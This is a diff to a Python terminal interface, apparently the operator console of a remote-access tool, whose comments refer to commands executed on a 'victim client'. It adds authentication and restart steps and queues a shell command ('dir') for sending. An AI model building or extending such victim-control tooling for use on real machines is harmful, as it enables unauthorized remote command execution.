@@ -7,7 +7,7 @@ from asciimatics.event import KeyboardEvent
 from asciimatics.screen import Screen
 from asciimatics.parsers import AnsiTerminalParser, Parser
 from asciimatics.exceptions import ResizeScreenError, NextScene, StopApplication
-from RCA import TCP_MASTER
+from RCA import TCP_MASTER,CODECS_FLE
 class ListView(Frame):
     def __init__(self, screen, model:TCP_MASTER):
         super(ListView, self).__init__(screen,
@@ -20,38 +20,52 @@ class ListView(Frame):
                                        )
         # Save off the model that accesses the contacts database.
         self._model = model
+        # at the starten of the week
+        
         # Create the form for displaying the list ozf contacts.
         #self._list_view = ListBox(
         #    Widget.FILL_FRAME,
         #    model.get_summary(), name="contacts", on_select=self._on_pick)
         self.logging = TextBox(Widget.FILL_FRAME,name='logging',readonly=True,as_string=True,line_wrap=True)
         self._model.stdout = lambda arg: self.displayValue(arg)
+        self._model.stdout('STARTING LOGGER'.center(int(screen.width * 0.50) - 1,'='))
+        self.authenticateUser()
         self.set_theme(theme='green')
         layout = Layout([100], fill_frame=True)
         self.add_layout(layout)
         layout.add_widget(self.logging)
         layout.add_widget(Divider())
-        layout2 = Layout([1])
+        layout2 = Layout([1,1,1,1])
         self.add_layout(layout2)
         layout2.add_widget(Button("Quit", self._quit), 0)
-        self._model.stdout('STARTING LOGGER'.center(int(screen.width * 0.50) - 1,'='))
+        layout2.add_widget(Button("Restart",self._restart),3)
         self.fix()
+    def _restart(self):
+        self._model.codec = CODECS_FLE.get('0x17')#{'HEADER':'0x17'}
+        self._model.run()
     def checkSucress(self):
-        self._model.codec = {'HEADER':'0x16'}
+        self._model.codec = CODECS_FLE.get('0x16')
     def checkErrors(self):
-        self._model.codec = {'HEADER':'0x15'}
+        self._model.codec = CODECS_FLE.get('0x15')
     def writeCommand(self):
-        self._model.codec = {'HEADER':'0x11'}
-        self._model.command = ''# Text.data for example
+        self._model.codec = CODECS_FLE.get('0x11')
+        self._model.command = 'dir'# Text.data for example
     def displayValue(self,arg:str):
         ''' this method will display in the logging widget the new data parsed ''' 
         self.logging.value += str(arg) + '\n'
     def _restartServer(self):
         self._model.restartServer()
+    def authenticateUser(self):
+        ''' this funciton will be used to autenticate the account user'''
+        self._model.codec = CODECS_FLE.get('0x04')
+        self._model.run()
+        self._model.codec = CODECS_FLE.get('0x10')
+        self._model.run()
     def _reload_logging(self):
         ''' this funcion will be used to reload and load the new information about the command executed in the victim client '''
-        self._model.codec = {'HEADER':'0x15'}
+        # check for errors
         self.checkErrors()
+        #self._model.run()
         self._model.run()
         self.checkSucress()
         self._model.run()
@@ -256,9 +270,13 @@ class Terminal(Widget):
                 if event.key_code == 13:
                     self.value = self._canvas.get_from(x=self._canvas.width, y=self._cursor_y)
                     # gets the data what will sended to the server
+                    #self._model.codec = CODECS_FLE.get('0x06')
+                    #self._model.command = 'echo "hello world !"'
+                    #self.
                     self._cursor_x = 4# start line prompit
                     self.on_scape()
                     self.prompit(start_y=self._cursor_y)
+                    
                 
                 else:
                     self._add_stream(chr(event.key_code))
@@ -300,7 +318,10 @@ class testFrame(Frame):
         self.fix()
     def _reload_logging(self):
         ''' this funcion will be used to reload and load the new information about the command executed in the victim client '''
-        pass
+        self.save()
+        print(self.data.get('he'))
+        
+        pass#self._model.run()
     @staticmethod
     def _quit():
         raise StopApplication("User pressed quit")
